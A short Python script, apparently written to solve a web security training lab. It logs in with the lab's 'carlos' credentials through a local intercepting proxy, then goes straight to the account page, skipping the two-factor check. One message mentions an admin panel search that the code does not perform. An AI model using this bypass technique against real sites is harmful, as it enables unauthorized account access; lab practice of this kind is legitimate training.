import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def carlos_2fa(s,url):
     login_url = url+"/login"
     print("(+) Login carlos")
     data = {"username": "carlos",
            "password": "montoya"}
    
     r = s.post(login_url, data=data, allow_redirects=False, verify=False, proxies=proxies)
     my_account_url = url +"/my-account"
     r = s.get(my_account_url,  verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Giriş okey")
     else:
        print("[+] Giriş yok")
        sys.exit(-1)




if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
  
    s = requests.Session()
    url = sys.argv[1]
    print("[+] Admin panel arıyorum.......")
    carlos_2fa(s, url)


